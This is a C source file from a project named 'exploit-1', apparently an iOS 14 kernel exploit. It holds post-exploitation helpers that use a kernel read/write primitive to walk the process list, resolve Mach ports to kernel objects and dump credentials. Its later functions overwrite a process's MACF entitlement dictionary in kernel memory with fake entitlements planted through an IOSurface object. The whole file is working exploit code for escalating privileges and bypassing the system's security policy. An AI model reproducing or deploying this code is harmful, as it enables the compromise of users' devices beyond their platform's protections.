//
//  k_utils.c
//  exploit-1
//
//  Created by Quote on 2020/12/24.
//  Copyright © 2020 Quote. All rights reserved.
//

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach_types.h>
#include "mycommon.h"
#include "utils.h"
#include "k_utils.h"
#include "kapi.h"
#include "k_offsets.h"

#define KPTR_NULL ((kptr_t) 0)
#define KERN_POINTER_VALID(val) ((val) >= 0xffff000000000000 && (val) != 0xffffffffffffffff)

#define _assert(x)

static void kproc_foreach(kptr_t proc, bool (^match)(kptr_t, pid_t))
{
    pid_t pid;
    kptr_t next;
    while (KERN_POINTER_VALID(proc)) {
        pid = kapi_read32(proc + OFFSET(proc, p_pid));
        if (g_exp.debug) {
            util_info("pid %u", pid);
            util_msleep(100);
        }
        if (match(proc, pid)) {
            break;
        }
        next = kapi_read_kptr(proc + OFFSET(proc, le_next));
        if (next == KPTR_NULL) {
            break;
        }
        proc = next;
    }
}

kptr_t kproc_find_pid0(kptr_t proc)
{
    __block kptr_t proc0 = KPTR_NULL;
    bool (^const handler)(kptr_t, pid_t) = ^ bool (kptr_t found_proc, pid_t found_pid) {
        if (found_pid == 0) {
            proc0 = found_proc;
            return true;
        }
        return false;
    };
    kproc_foreach(proc, handler);
    if(proc0 == KPTR_NULL) {
        util_error("can not find proc0");
    }
    return proc0;
}


static void kproc_foreach_reverse(kptr_t proc, bool (^match)(kptr_t, pid_t))
{
    pid_t pid;
    kptr_t prev;
    while (KERN_POINTER_VALID(proc)) {
        pid = kapi_read32(proc + OFFSET(proc, p_pid));
        if (g_exp.debug) {
            util_info("pid %u", pid);
            util_msleep(100);
        }
        if (match(proc, pid)) {
            break;
        }
        prev = kapi_read_kptr(proc + OFFSET(proc, le_prev));
        if (prev == KPTR_NULL) {
            break;
        }
        proc = prev - OFFSET(proc, le_next);
    }
}

kptr_t kproc_find_by_pid(pid_t pid)
{
    __block kptr_t proc = KPTR_NULL;
    bool (^const handler)(kptr_t, pid_t) = ^ bool (kptr_t found_proc, pid_t found_pid) {
        if (found_pid == pid) {
            proc = found_proc;
            return true;
        }
        return false;
    };
    kproc_foreach_reverse(g_exp.kernel_proc, handler);
    if(proc == KPTR_NULL) {
        util_error("can not find kproc for pid %u", pid);
    }
    return proc;
}

kptr_t ipc_entry_lookup(mach_port_t port_name)
{
    kptr_t itk_space = g_exp.self_ipc_space;
    uint32_t table_size = kapi_read32(itk_space + OFFSET(ipc_space, is_table_size));
    uint32_t port_index = MACH_PORT_INDEX(port_name);
    if (port_index >= table_size) {
        util_warning("invalid port name %#x", port_name);
        return 0;
    }
    kptr_t is_table = kapi_read_kptr(itk_space + OFFSET(ipc_space, is_table));
    kptr_t entry = is_table + port_index * SIZE(ipc_entry);
    return entry;
}

kptr_t port_name_to_ipc_port(mach_port_t port_name)
{
    kptr_t entry = ipc_entry_lookup(port_name);
    kptr_t ipc_port = kapi_read_kptr(entry + OFFSET(ipc_entry, ie_object));
    return ipc_port;
}

kptr_t port_name_to_kobject(mach_port_t port_name)
{
    kptr_t ipc_port = port_name_to_ipc_port(port_name);
    kptr_t kobject = kapi_read_kptr(ipc_port + OFFSET(ipc_port, ip_kobject));
    return kobject;
}

void debug_dump_ipc_port(mach_port_t port_name, kptr_t *kobj)
{
    kptr_t entry = ipc_entry_lookup(port_name);
    if (entry == 0) {
        util_error("can not find port entry %#x", port_name);
        return;
    }
    kptr_t object = kapi_read_kptr(entry + OFFSET(ipc_entry, ie_object));
    uint32_t ip_bits = kapi_read32(object + OFFSET(ipc_port, ip_bits));
    uint32_t ip_refs = kapi_read32(object + OFFSET(ipc_port, ip_references));
    kptr_t kobject = kapi_read_kptr(object + OFFSET(ipc_port, ip_kobject));
    util_info("ipc_port: ip_bits %#x, ip_refs %#x", ip_bits, ip_refs);
    util_info("ip_kobject: %#llx", kobject);
    if (kobj) {
        *kobj = kobject;
    }
}

void debug_dump_proc_cred(kptr_t proc)
{
    kptr_t proc_p_ucred = kapi_read_kptr(proc + OFFSET(proc, p_ucred));
    kptr_t p_ucred_cr_label = proc_p_ucred + OFFSET(ucred, cr_posix);

    char old_cred[SIZE(posix_cred)];
    kapi_read(p_ucred_cr_label, old_cred, SIZE(posix_cred));

    kptr_t cr_label = kapi_read_kptr(p_ucred_cr_label + SIZE(posix_cred));

    util_info("cr_label %#llx", cr_label);
    if (cr_label) {
        int l_flags = kapi_read32(cr_label + 0x00);
        util_info("l_flags %#x", l_flags);
        kptr_t labels[3];
        labels[0] = kapi_read_kptr(cr_label + 0x08);
        labels[1] = kapi_read_kptr(cr_label + 0x10);
        labels[2] = kapi_read_kptr(cr_label + 0x18);
        for (int i = 0; i < arrayn(labels); i++) {
            util_info("label[%d] %#llx", i, labels[i]);
        }
    }
    util_printf("---- end ----\n");
    util_msleep(200);
}

struct kOSDict *kernel_fetch_dict(kptr_t dict_addr)
{
    char obj[0x28];
    kapi_read(dict_addr, obj, sizeof(obj));
    uint32_t cap = *(uint32_t *)(obj + OFFSET(OSDictionary, capacity));
    struct kOSDict *dict;
    size_t alloc_size = sizeof(*dict) + cap * (sizeof(struct kDictEntry) + sizeof(char *) + 256);
    dict = (struct kOSDict *)malloc(alloc_size);
    dict->self_addr = dict_addr;
    dict->cap = cap;
    dict->count = *(uint32_t *)(obj + OFFSET(OSDictionary, count));
    dict->items_addr = kapi_read_kptr(dict_addr + OFFSET(OSDictionary, dictionary));
    char *ptr = dict->data;
    dict->items = (struct kDictEntry *)ptr;
    ptr += sizeof(struct kDictEntry) * dict->cap;
    dict->names = (char **)ptr;
    ptr += sizeof(char *) * dict->cap;
    for (int i = 0; i < dict->cap; i++) {
        dict->names[i] = ptr;
        ptr += 256;
    }
    util_info("dict %#llx, items %#llx, count %u, capacity %u",
            dict->self_addr, dict->items_addr, dict->count, dict->cap);
    alloc_size = sizeof(struct kDictEntry) * dict->cap;
    kapi_read(dict->items_addr, dict->items, alloc_size);
    for (int i = 0; i < dict->count; i++) {
        char obj[0x18];
        kapi_read(dict->items[i].key, obj, sizeof(obj));
        // OSSymbol
        uint32_t len = *(uint32_t *)(obj + 0xc) >> 14;
        if (len >= 256) {
            len = 255;
        }
        // PACed in iOS 14.3
        kptr_t string = *(kptr_t *)(obj + OFFSET(OSString, string));
        string |= 0xffffff8000000000;
        kapi_read(string, dict->names[i], len);
        dict->names[i][len] = 0;
        util_info("    -> %s", dict->names[i]);
    }
    return dict;
}

struct kOSDict *proc_fetch_MACF(kptr_t proc)
{
    kptr_t proc_p_ucred = kapi_read_kptr(proc + OFFSET(proc, p_ucred));
    kptr_t p_ucred_cr_label = proc_p_ucred + OFFSET(ucred, cr_posix) + SIZE(posix_cred);

    kptr_t cr_label = kapi_read_kptr(p_ucred_cr_label);

    if (cr_label == 0) {
        util_error("cr_label is NULL?");
        return NULL;
    }

    kptr_t MACF_slot = kapi_read_kptr(cr_label + 0x08);
    if (MACF_slot == 0) {
        util_error("MACF slot is NULL?");
        return NULL;
    }
    struct kOSDict *macf = kernel_fetch_dict(MACF_slot);
    return macf;
}

void proc_write_MACF(kptr_t proc, struct kOSDict *macf)
{
    size_t alloc_size = sizeof(struct kDictEntry) * macf->cap;
    kapi_write32(macf->self_addr + OFFSET(OSDictionary, count), macf->count);
    kapi_write(macf->items_addr, macf->items, alloc_size);
}

extern mach_port_t IOSurface_worker_uc;
extern uint32_t IOSurface_worker_id;

static struct kOSDict *fake_ents;

void prepare_fake_entitlements(void)
{
    kptr_t surfRoot = port_name_to_kobject(IOSurface_worker_uc);
    kptr_t surfClients = kapi_read_kptr(surfRoot + OFFSET(IOSurfaceRootUserClient, surfaceClients));
    kptr_t surfClient = kapi_read_kptr(surfClients + sizeof(kptr_t) * IOSurface_worker_id);
    kptr_t surface = kapi_read_kptr(surfClient + OFFSET(IOSurfaceClient, surface));
    kptr_t values = kapi_read_kptr(surface + OFFSET(IOSurface, values));

    struct kOSDict *dict = kernel_fetch_dict(values);
    // [0] CreationProperties
    // [1] essential-entitlements
    for (int i = 0; i < dict->count; i++) {
        if (!strcmp(dict->names[i], "essential-entitlements")) {
            fake_ents = kernel_fetch_dict(dict->items[i].value);
            break;
        }
    }
    fail_if(fake_ents == NULL, "no prepared entitlements?");
    free(dict);
}

struct kDictEntry *borrow_fake_entitlement(const char *name)
{
    struct kDictEntry *entry = NULL;
    for (int i = 0; i < fake_ents->count; i++) {
        if (!strcmp(fake_ents->names[i], name)) {
            entry = &fake_ents->items[i];
        }
    }
    return entry;
}
